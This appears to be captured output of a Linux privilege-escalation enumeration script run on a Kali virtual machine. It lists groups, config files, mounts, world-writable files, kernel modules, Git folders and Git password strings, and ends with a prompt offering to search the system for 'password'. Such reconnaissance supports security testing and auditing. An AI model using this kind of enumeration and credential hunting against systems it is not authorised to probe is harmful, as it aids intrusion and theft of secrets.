+audio:x:29:pulse,kali
+dip:x:30:kali
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:kali
+sasl:x:45:
+plugdev:x:46:kali
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+sgx:x:105:
+kvm:x:106:
+render:x:107:
+crontab:x:108:
+netdev:x:109:kali
+mysql:x:110:
+tss:x:111:
+systemd-timesync:x:112:
+redsocks:x:113:
+messagebus:x:114:
+kismet:x:115:
+_ssh:x:116:
+ssl-cert:x:117:postgres
+plocate:x:118:
+wireshark:x:119:kali,root
+tcpdump:x:120:
+rtkit:x:121:
+bluetooth:x:122:kali
+kali-trusted:x:123:
+i2c:x:124:
+avahi:x:125:
+stunnel4:x:126:
+Debian-snmp:x:127:
+sslh:x:128:
+postgres:x:129:
+nm-openvpn:x:130:
+nm-openconnect:x:131:
+pulse:x:132:
+pulse-access:x:133:
+scanner:x:134:saned,kali
+saned:x:135:
+sambashare:x:136:
+inetsim:x:137:
+lightdm:x:138:
+colord:x:139:
+geoclue:x:140:
+kpadmins:x:141:
+kali:x:1000:
+kaboxer:x:142:kali,root
+systemd-coredump:x:999:
+_cvsadmin:x:143:
+
+[0;94m###################################################[0m
+[0;94mDocker                                            #[0m
+[0;94m###################################################[0m
+You are not in docker groups
+
+[0;94m###################################################[0m
+[0;94mConf /etc                                         #[0m
+[0;94m###################################################[0m
+ 4 -rw-r--r--  1 root     root      2981 Dec  1 21:29 adduser.conf
+ 8 -rw-r--r--  1 root     root      5662 Dec  1 21:53 ca-certificates.conf
+ 4 drwxr-xr-x  3 root     root      4096 Dec  1 21:44 dconf
+ 4 -rw-r--r--  1 root     root      2969 Oct 29 09:04 debconf.conf
+ 4 -rw-r--r--  1 root     root       604 Jun 26  2016 deluser.conf
+ 4 -rw-r--r--  1 root     root       214 Apr  4  2020 dns2tcpd.conf
+ 4 -rw-r--r--  1 root     root       685 Aug 18 22:47 e2scrub.conf
+ 4 -rw-r--r--  1 root     root       694 Sep 16 11:41 fuse.conf
+ 4 -rw-r--r--  1 root     root      2584 Aug  4  2020 gai.conf
+ 4 -rw-r--r--  1 root     root       698 Aug  6 18:30 gitweb.conf
+ 8 -rw-r--r--  1 root     root      4436 Dec 15  2020 hdparm.conf
+ 4 -rw-r--r--  1 root     root         9 Nov 25 07:20 host.conf
+ 4 -rw-r--r--  1 root     root       206 Jun 28 03:15 idmapd.conf
+ 4 drwxr-xr-x  2 root     root      4096 Dec  1 21:53 insserv.conf.d
+ 4 -rw-r--r--  1 root     root       608 Oct 19 16:34 ipsec.conf
+ 4 -rw-r--r--  1 root     root       144 Dec  1 21:59 kernel-img.conf
+ 4 -rw-r--r--  1 root     root        34 Jul 29  2019 ld.so.conf
+ 4 drwxr-xr-x  2 root     root      4096 Dec  1 21:53 ld.so.conf.d
+ 4 -rw-r--r--  1 root     root        26 Dec 20  2020 libao.conf
+ 4 -rw-r--r--  1 root     root       191 Oct  9 05:45 libaudit.conf
+ 4 -rw-r--r--  1 root     root       494 Aug 16 11:25 logrotate.conf
+ 8 -rw-r--r--  1 root     root      5215 Feb 19  2021 manpath.config
+ 4 -rw-r--r--  1 root     root       264 Jul 26  2019 miredo.conf
+ 4 -rw-r--r--  1 root     root       782 Aug 18 22:47 mke2fs.conf
+ 4 -rw-r--r--  1 root     root       767 Aug 17 11:16 netconfig
+ 4 -rwxr-xr-x  1 root     root       228 Sep  4 12:45 nftables.conf
+ 4 -rw-r--r--  1 root     root      3287 Jan 29  2021 nikto.conf
+ 4 -rw-r--r--  1 root     root       510 Dec  1 21:52 nsswitch.conf
+ 4 -rw-r--r--  1 root     root       552 Jan 30  2021 pam.conf
+ 8 -rw-r--r--  1 root     root      5808 Sep 10 16:50 proxychains4.conf
+ 4 -rw-r--r--  1 root     root      2431 Jan  2  2017 redsocks.conf
+ 4 -rw-r--r--  1 root     root      1889 Feb 10  2020 request-key.conf
+ 4 -rw-r--r--  1 root     root        78 Dec 17 03:08 resolv.conf
+ 4 -rw-r--r--  1 root     root      1974 Nov 11 08:46 rsyslog.conf
+ 4 drwxr-xr-x  2 root     root      4096 Dec  1 21:55 sddm.conf.d
+12 -rw-r--r--  1 root     root     10593 Jan 30  2021 sensors3.conf
+ 8 -rw-r--r--  1 root     root      7042 Jan  7  2021 smartd.conf
+ 4 -rw-r--r--  1 root     root      1201 Dec  2  2018 smi.conf
+ 4 -rw-r--r--  1 root     root       281 Oct 19 16:34 strongswan.conf
+ 4 -rw-r--r--  1 root     root      3975 Feb 27  2021 sudo.conf
+ 8 -rw-r--r--  1 root     root      6169 Feb 27  2021 sudo_logsrvd.conf
+ 4 -rw-r--r--  1 root     root      2355 Apr  6  2021 sysctl.conf
+ 4 -rw-r--r--  1 root     root      1493 Oct 15 04:00 tightvncserver.conf
+ 4 -rw-r--r--  1 root     root      1158 Dec 14 07:54 tmux.conf
+ 4 -rw-r--r--  1 root     root      1260 Jun 16  2020 ucf.conf
+ 4 -rw-r--r--  1 root     root       513 Jun 19 11:35 updatedb.conf
+ 4 -rw-r--r--  1 root     root       681 Aug 29 07:04 xattr.conf
+
+[0;94m###################################################[0m
+[0;94mFilesystems                                        #[0m
+[0;94m###################################################[0m
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# systemd generates mount units based on this file, see systemd.mount(5).
+# Please run 'systemctl daemon-reload' after making changes here.
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+# / was on /dev/sda1 during installation
+UUID=79da8732-84b2-49c8-a160-d7e3b509098d /               ext4    errors=remount-ro 0       1
+# swap was on /dev/sda5 during installation
+UUID=cb525e88-c133-4b8c-8ad2-12142c8bee0f none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=4027228k,nr_inodes=1006807,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=813920k,mode=755,inode64)
+/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
+cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+none on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10119)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+debugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
+tracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
+fusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+configfs on /sys/kernel/config type configfs (rw,nosuid,nodev,noexec,relatime)
+sunrpc on /run/rpc_pipefs type rpc_pipefs (rw,relatime)
+none on /run/credentials/systemd-sysusers.service type ramfs (ro,nosuid,nodev,noexec,relatime,mode=700)
+vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,relatime,user_id=0,group_id=0,default_permissions,allow_other)
+binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=813916k,nr_inodes=203479,mode=700,uid=1000,gid=1000,inode64)
+gvfsd-fuse on /run/user/1000/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)
+
+[0;94m###################################################[0m
+[0;94mWorld writable directories                        #[0m
+[0;94m###################################################[0m
+
+[0;94m###################################################[0m
+[0;94mWorld writable files                              #[0m
+[0;94m###################################################[0m
+-rw-rw-rw- 1 root root 0 Dec 14 08:30 /sys/kernel/security/apparmor/.remove
+-rw-rw-rw- 1 root root 0 Dec 14 08:30 /sys/kernel/security/apparmor/.replace
+-rw-rw-rw- 1 root root 0 Dec 14 08:30 /sys/kernel/security/apparmor/.load
+-rw-rw-rw- 1 root root 0 Dec 14 08:30 /sys/kernel/security/apparmor/.access
+-rw-rw-rw- 1 root root 0 Dec 14 08:30 /sys/kernel/security/tomoyo/self_domain
+
+No bash scripts
+
+[0;94m###################################################[0m
+[0;94mNFS                                               #[0m
+[0;94m###################################################[0m
+
+[0;94m###################################################[0m
+[0;94mIptableS                                          #[0m
+[0;94m###################################################[0m
+
+[0;94m###################################################[0m
+[0;94mWP database                                       #[0m
+[0;94m###################################################[0m
+No wordpress database
+
+[0;94m###################################################[0m
+[0;94mMattermost                                        #[0m
+[0;94m###################################################[0m
+No Mattermost config file
+
+[0;94m###################################################[0m
+[0;94mBackups shadow/passwd                             #[0m
+[0;94m###################################################[0m
+alternatives.tar.0
+apt.extended_states.0
+apt.extended_states.1.gz
+dpkg.arch.0
+dpkg.diversions.0
+dpkg.statoverride.0
+dpkg.status.0
+
+[0;94m###################################################[0m
+[0;94mDocker-compose                                    #[0m
+[0;94m###################################################[0m
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/python-3-postgres/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/docker-from-docker-compose/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/ruby-rails-postgres/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/elixir-phoenix-postgres/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/dapr-dotnet/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/docker-existing-docker-compose/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/javascript-node-postgres/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/php-mariadb/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/javascript-node-mongo/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/javascript-node-azurite/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/dapr-javascript-node/.devcontainer/docker-compose.yml
+/home/kali/.vscode/extensions/ms-vscode-remote.remote-containers-0.209.6/dist/node_modules/vscode-dev-containers/containers/dotnet-mssql/.devcontainer/docker-compose.yml
+
+[0;94m###################################################[0m
+[0;94mPartitions                                        #[0m
+[0;94m###################################################[0m
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
+sda      8:0    0   80G  0 disk 
+├─sda1   8:1    0   79G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom  
+
+[0;94m###################################################[0m
+[0;94mKernel modules                                    #[0m
+[0;94m###################################################[0m
+Module                  Size  Used by
+nfnetlink              20480  0
+tun                    61440  8
+btusb                  65536  0
+btrtl                  28672  1 btusb
+btbcm                  20480  1 btusb
+btintel                32768  1 btusb
+bluetooth             757760  5 btrtl,btintel,btbcm,btusb
+jitterentropy_rng      16384  1
+sha512_ssse3           49152  1
+sha512_generic         16384  1 sha512_ssse3
+drbg                   40960  1
+ansi_cprng             16384  0
+ecdh_generic           16384  1 bluetooth
+ecc                    40960  1 ecdh_generic
+snd_seq_dummy          16384  0
+snd_seq_midi           20480  0
+snd_seq_midi_event     16384  1 snd_seq_midi
+snd_hrtimer            16384  1
+snd_seq                94208  9 snd_seq_midi,snd_seq_midi_event,snd_seq_dummy
+rfkill                 32768  3 bluetooth
+intel_rapl_msr         20480  0
+ppdev                  24576  0
+vsock_loopback         16384  0
+vmw_balloon            24576  0
+vmw_vsock_virtio_transport_common    49152  1 vsock_loopback
+intel_rapl_common      28672  1 intel_rapl_msr
+snd_ens1371            36864  3
+snd_ac97_codec        180224  1 snd_ens1371
+vmw_vsock_vmci_transport    32768  2
+ac97_bus               16384  1 snd_ac97_codec
+joydev                 28672  0
+serio_raw              20480  0
+gameport               20480  1 snd_ens1371
+snd_rawmidi            45056  2 snd_seq_midi,snd_ens1371
+snd_seq_device         16384  3 snd_seq,snd_seq_midi,snd_rawmidi
+vsock                  53248  7 vmw_vsock_virtio_transport_common,vsock_loopback,vmw_vsock_vmci_transport
+snd_pcm               143360  2 snd_ac97_codec,snd_ens1371
+pcspkr                 16384  0
+snd_timer              49152  3 snd_seq,snd_hrtimer,snd_pcm
+snd                   110592  15 snd_seq,snd_seq_device,snd_timer,snd_ac97_codec,snd_pcm,snd_rawmidi,snd_ens1371
+sg                     36864  0
+soundcore              16384  1 snd
+vmw_vmci               86016  2 vmw_balloon,vmw_vsock_vmci_transport
+parport_pc             40960  0
+parport                73728  2 parport_pc,ppdev
+evdev                  28672  8
+ac                     20480  0
+binfmt_misc            24576  1
+sunrpc                663552  1
+fuse                  167936  5
+configfs               57344  1
+ip_tables              36864  0
+x_tables               53248  1 ip_tables
+autofs4                53248  2
+ext4                  917504  1
+crc16                  16384  2 bluetooth,ext4
+mbcache                16384  1 ext4
+jbd2                  167936  1 ext4
+crc32c_generic         16384  0
+sd_mod                 61440  3
+t10_pi                 16384  1 sd_mod
+crc_t10dif             20480  1 t10_pi
+crct10dif_generic      16384  0
+hid_generic            16384  0
+usbhid                 65536  0
+hid                   151552  2 usbhid,hid_generic
+sr_mod                 28672  0
+cdrom                  77824  1 sr_mod
+ata_generic            16384  0
+crct10dif_pclmul       16384  1
+crct10dif_common       16384  3 crct10dif_generic,crc_t10dif,crct10dif_pclmul
+crc32_pclmul           16384  0
+crc32c_intel           24576  2
+ghash_clmulni_intel    16384  0
+vmwgfx                385024  4
+ttm                    86016  1 vmwgfx
+drm_kms_helper        307200  1 vmwgfx
+aesni_intel           380928  0
+crypto_simd            16384  1 aesni_intel
+cec                    61440  1 drm_kms_helper
+ata_piix               36864  0
+rc_core                65536  1 cec
+cryptd                 24576  2 crypto_simd,ghash_clmulni_intel
+psmouse               184320  0
+mptspi                 28672  2
+mptscsih               32768  1 mptspi
+ehci_pci               20480  0
+uhci_hcd               53248  0
+mptbase                77824  2 mptspi,mptscsih
+ehci_hcd               98304  1 ehci_pci
+libata                294912  2 ata_piix,ata_generic
+scsi_transport_spi     40960  1 mptspi
+usbcore               331776  5 ehci_pci,usbhid,ehci_hcd,btusb,uhci_hcd
+drm                   634880  7 vmwgfx,drm_kms_helper,ttm
+usb_common             16384  3 usbcore,ehci_hcd,uhci_hcd
+e1000                 155648  0
+scsi_mod              262144  7 mptspi,sd_mod,scsi_transport_spi,mptscsih,libata,sg,sr_mod
+i2c_piix4              28672  0
+battery                28672  0
+floppy                 94208  0
+button                 24576  0
+For more informations about kernel module, type : /sbin/modinfo <module>
+
+[0;94m###################################################[0m
+[0;94mAuth.log                                          #[0m
+[0;94m###################################################[0m
+Module                  Size  Used by
+nfnetlink              20480  0
+tun                    61440  8
+btusb                  65536  0
+btrtl                  28672  1 btusb
+btbcm                  20480  1 btusb
+btintel                32768  1 btusb
+bluetooth             757760  5 btrtl,btintel,btbcm,btusb
+jitterentropy_rng      16384  1
+sha512_ssse3           49152  1
+sha512_generic         16384  1 sha512_ssse3
+drbg                   40960  1
+ansi_cprng             16384  0
+ecdh_generic           16384  1 bluetooth
+ecc                    40960  1 ecdh_generic
+snd_seq_dummy          16384  0
+snd_seq_midi           20480  0
+snd_seq_midi_event     16384  1 snd_seq_midi
+snd_hrtimer            16384  1
+snd_seq                94208  9 snd_seq_midi,snd_seq_midi_event,snd_seq_dummy
+rfkill                 32768  3 bluetooth
+intel_rapl_msr         20480  0
+ppdev                  24576  0
+vsock_loopback         16384  0
+vmw_balloon            24576  0
+vmw_vsock_virtio_transport_common    49152  1 vsock_loopback
+intel_rapl_common      28672  1 intel_rapl_msr
+snd_ens1371            36864  3
+snd_ac97_codec        180224  1 snd_ens1371
+vmw_vsock_vmci_transport    32768  2
+ac97_bus               16384  1 snd_ac97_codec
+joydev                 28672  0
+serio_raw              20480  0
+gameport               20480  1 snd_ens1371
+snd_rawmidi            45056  2 snd_seq_midi,snd_ens1371
+snd_seq_device         16384  3 snd_seq,snd_seq_midi,snd_rawmidi
+vsock                  53248  7 vmw_vsock_virtio_transport_common,vsock_loopback,vmw_vsock_vmci_transport
+snd_pcm               143360  2 snd_ac97_codec,snd_ens1371
+pcspkr                 16384  0
+snd_timer              49152  3 snd_seq,snd_hrtimer,snd_pcm
+snd                   110592  15 snd_seq,snd_seq_device,snd_timer,snd_ac97_codec,snd_pcm,snd_rawmidi,snd_ens1371
+sg                     36864  0
+soundcore              16384  1 snd
+vmw_vmci               86016  2 vmw_balloon,vmw_vsock_vmci_transport
+parport_pc             40960  0
+parport                73728  2 parport_pc,ppdev
+evdev                  28672  8
+ac                     20480  0
+binfmt_misc            24576  1
+sunrpc                663552  1
+fuse                  167936  5
+configfs               57344  1
+ip_tables              36864  0
+x_tables               53248  1 ip_tables
+autofs4                53248  2
+ext4                  917504  1
+crc16                  16384  2 bluetooth,ext4
+mbcache                16384  1 ext4
+jbd2                  167936  1 ext4
+crc32c_generic         16384  0
+sd_mod                 61440  3
+t10_pi                 16384  1 sd_mod
+crc_t10dif             20480  1 t10_pi
+crct10dif_generic      16384  0
+hid_generic            16384  0
+usbhid                 65536  0
+hid                   151552  2 usbhid,hid_generic
+sr_mod                 28672  0
+cdrom                  77824  1 sr_mod
+ata_generic            16384  0
+crct10dif_pclmul       16384  1
+crct10dif_common       16384  3 crct10dif_generic,crc_t10dif,crct10dif_pclmul
+crc32_pclmul           16384  0
+crc32c_intel           24576  2
+ghash_clmulni_intel    16384  0
+vmwgfx                385024  4
+ttm                    86016  1 vmwgfx
+drm_kms_helper        307200  1 vmwgfx
+aesni_intel           380928  0
+crypto_simd            16384  1 aesni_intel
+cec                    61440  1 drm_kms_helper
+ata_piix               36864  0
+rc_core                65536  1 cec
+cryptd                 24576  2 crypto_simd,ghash_clmulni_intel
+psmouse               184320  0
+mptspi                 28672  2
+mptscsih               32768  1 mptspi
+ehci_pci               20480  0
+uhci_hcd               53248  0
+mptbase                77824  2 mptspi,mptscsih
+ehci_hcd               98304  1 ehci_pci
+libata                294912  2 ata_piix,ata_generic
+scsi_transport_spi     40960  1 mptspi
+usbcore               331776  5 ehci_pci,usbhid,ehci_hcd,btusb,uhci_hcd
+drm                   634880  7 vmwgfx,drm_kms_helper,ttm
+usb_common             16384  3 usbcore,ehci_hcd,uhci_hcd
+e1000                 155648  0
+scsi_mod              262144  7 mptspi,sd_mod,scsi_transport_spi,mptscsih,libata,sg,sr_mod
+i2c_piix4              28672  0
+battery                28672  0
+floppy                 94208  0
+button                 24576  0
+cat /var/log/auth.log
+
+[0;94m###################################################[0m
+[0;94mGit password                                      #[0m
+[0;94m###################################################[0m
+[0;91mGit passwords :         PRIVATE_TYPES   = [ :password ]
+                                               http_password)
+                                        'user[password]' => credential.private, [0m
+
+[0;94m###################################################[0m
+[0;94mGit folder                                        #[0m
+[0;94m###################################################[0m
+[0;91mGit folders : /home/kali/Tools/LSB-Steganography/.git
+/home/kali/Tools/SecLists/.git
+/home/kali/Tools/scripts/.git
+/home/kali/Tools/shellgen/.git
+/home/kali/Documents/Petibonum_docs/.git
+/home/kali/Documents/GOTHAM/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/Seatbelt/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpWMI/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpSploit/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpDPAPI/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpDump/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpSC/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/SharpUp/.git
+/usr/share/powershell-empire/empire/server/csharp/Covenant/Data/ReferenceSourceLibraries/Rubeus/.git
+/usr/share/powershell-empire/empire/server/data/profiles/.git [0m
+
+[0;94m###################################################[0m
+[0;94mDocker escape                                     #[0m
+[0;94m###################################################[0m
+You are not in container
+
+[0;94m###################################################[0m
+[0;94mFind each string "password"                      #[0m
+[0;94mOutput in password.txt                            #[0m
+[0;94m###################################################[0m
+Launch password research (yes/no)?
